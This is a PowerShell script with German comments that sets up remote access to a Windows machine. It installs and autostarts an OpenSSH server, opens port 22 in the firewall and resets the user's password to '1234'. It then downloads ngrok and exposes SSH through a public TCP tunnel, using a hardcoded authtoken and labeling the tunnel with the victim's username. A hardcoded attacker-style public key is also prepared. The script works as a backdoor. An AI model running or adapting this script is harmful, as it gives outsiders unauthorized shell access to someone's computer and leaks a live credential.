#befehle:
$config = "# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey __PROGRAMDATA__/ssh/ssh_host_rsa_key
#HostKey __PROGRAMDATA__/ssh/ssh_host_dsa_key
#HostKey __PROGRAMDATA__/ssh/ssh_host_ecdsa_key
#HostKey __PROGRAMDATA__/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

PubkeyAuthentication yes

# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
# but this is overridden so installations will only check .ssh/authorized_keys
AuthorizedKeysFile	.ssh/authorized_keys

#AuthorizedPrincipalsFile none

# For this to work you will also need host keys in %programData%/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
#PasswordAuthentication yes
#PermitEmptyPasswords no

# GSSAPI options
#GSSAPIAuthentication no

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
#PermitTTY yes
#PrintMotd yes
#PrintLastLog yes
#TCPKeepAlive yes
#UseLogin no
#PermitUserEnvironment no
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# override default of no subsystems
Subsystem	sftp	sftp-server.exe

# Example of overriding settings on a per-user basis
#Match User anoncvs
#	AllowTcpForwarding no
#	PermitTTY no
#	ForceCommand cvs server

Match Group administrators
       AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys"



#ssh key einbinden: 
takeown /f "$env:USERPROFILE\.ssh" /r /a



$key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDQtw2j4CnkO0H/t94jG0r4LUFSYX4czpKBFTun2vTGBsjKn2C0FxCIWD4i0sGJAzEtTK+wlrlbhmqqqu7J3AON1MNe+RDsOgOMMFn1n4M07qjFw4oqCVZAhLm4Qyrw3LjZ4ntW6mIKPjKt7AuEtXQhKxxLY2xgSUiQaRBiXQucuT1Rg/5q792NCzZNUjno6n4CNUp6lYfwfFfIMPYO+qSaCS0ImUNKzgNjrswa0ZUyI8znwev7TOnNLwjleVDzBTxOmuNR912QBLtLT/jBoF/tFbdYiDpRYyC+yB1NtSiE0/MXxghnytdokT93jD25L5DoWeItDo25aSBI4HlF/qVdDZYvGGUo5DH8K2YFgbvPRy7OGApnH2XhgfcYiGL2ILDI1S0dztWUJFMvJsUHWVIJ8hhORuk81hZivE4Faug9jgN2ZwLuW5PFwYkmrDtFpLcrBLLPspb7z+E8/7/yJq6Dt80uKf+fodZaQnwP4B5z1UCOM9fRQlV0HBMMiX9tj+1rgk1NAYKRvMvC9ooVG0w4GkvAFAcABfXkBhCYrUi7wDUSIG6waSpWVC62seL1Aq2XljIBbA4OgMz+YcuYStQwtfssXZ4+fsscsmHCm6LuPrLiVRtj3hP2DWk9nqb3YitAmz72cfY1GFqk98G4bYdzNGjM2WksDBy3dtjqjCmcRQ== mint@mint"
mkdir $env:USERPROFILE\.ssh -ErrorAction SilentlyContinue
#$key | Out-File -Encoding ascii $env:USERPROFILE\.ssh\authorized_keys
#$config | Out-File -Encoding ascii $env:USERPROFILE\.ssh\sshd_config


#rechte setzten:
# Deaktiviert vererbte Rechte
#icacls "$env:USERPROFILE\.ssh\authorized_keys" /inheritance:r

# Entfernt alle bestehenden Berechtigungen
#icacls "$env:USERPROFILE\.ssh\authorized_keys" /remove:g *S-1-1-0

# Gibt nur dem aktuellen Benutzer Lese- und Schreibrechte
$user = $env:USERNAME
$path = "$env:USERPROFILE\.ssh\authorized_keys"
#icacls $path /grant "${user}:F"
$path = "$env:USERPROFILE\.ssh"
#icacls $path /grant "${user}:F"
#icacls "$env:USERPROFILE\.ssh\authorized_keys" /grant:r "$env:USERNAME:(R,W)"
#
#icacls "$env:USERPROFILE\.ssh" /inheritance:r
#icacls "$env:USERPROFILE\.ssh" /grant:r "$env:USERNAME:(OI)(CI)(F)"
Set-LocalUser -Name $user -Password (ConvertTo-SecureString "1234" -AsPlainText -Force)

#Restart-Service sshd
#ornder wechseln

cd ~/Downloads
#rm -r .\loeschen\ -ErrorAction SilentlyContinue
mkdir loeschen9
cd .\loeschen9\

#start ssh

Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Remove-NetFirewallRule -Name sshd -ErrorAction SilentlyContinue
New-NetFirewallRule -Name sshd -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22

#download ngork und server starten

Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile "ngrok.zip"
Expand-Archive -Path ngrok.zip -DestinationPath . -Force
cd .
.\ngrok.exe authtoken 1o9DGXPfcM9VLCX7hWMDgWfg4kN_2nvoYyPzyiLYbvNb8rT5n
#.\ngrok.exe tcp 22
.\ngrok.exe tcp 22 --metadata="Benutzername: $(whoami)"




#stop service:
#Stop-Service sshd
#Set-Service -Name sshd -StartupType Automatic
#Start-Service sshd
#Stop-Service sshd
#Set-Service -Name sshd -StartupType Disabled
#Remove-NetFirewallRule -Name sshd
